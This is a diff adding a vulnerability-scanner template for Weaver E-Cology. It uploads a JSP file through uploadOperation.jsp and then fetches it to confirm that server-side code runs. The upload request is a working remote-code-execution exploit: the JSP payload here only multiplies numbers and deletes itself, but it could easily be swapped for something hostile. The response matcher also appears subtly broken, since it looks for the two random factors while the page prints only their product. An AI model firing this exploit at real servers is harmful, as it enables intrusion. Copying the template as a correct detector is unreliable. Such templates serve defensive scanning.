@@ -1,0 +1,45 @@
+id: weaver-e-cology-file-upload
+info:
+  name: Weaver E-Cology File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a file upload vulnerability in Weaver E-Cology allowing for the execution of JSP files.
+variables:
+  r1: '{{rand_base(4)}}'
+  r2: '{{rand_int(40000, 44800)}}'
+  r3: '{{rand_int(40000, 44800)}}'
+http:
+  - raw:
+      - |
+        POST /page/exportImport/uploadOperation.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
+
+        --b0d829daa06c13d6b3e16b0ad21d1eed
+        Content-Disposition: form-data; name="file"; filename="{{r1}}.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --b0d829daa06c13d6b3e16b0ad21d1eed--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /page/exportImport/fileTransfer/{{r1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{r2}}'
+          - '{{r3}}'
